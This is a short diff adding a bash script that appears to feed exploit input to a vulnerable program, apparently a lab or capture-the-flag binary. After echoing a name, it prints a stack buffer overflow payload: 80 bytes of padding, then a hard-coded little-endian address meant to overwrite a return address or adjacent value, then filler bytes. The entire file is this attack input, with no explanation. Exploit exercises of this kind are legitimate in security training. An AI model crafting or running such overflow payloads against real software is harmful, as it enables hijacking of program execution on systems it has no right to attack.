@@ -1,0 +1,3 @@
+#!/bin/bash
+echo dat_wil
+python -c 'import sys; sys.stdout.write("\xAA\xAA\xAA\xAA" * 20 + "\xb9\xb1\xff\xff" +"\xBB\xBB\xBB\xBB" + "\n")'
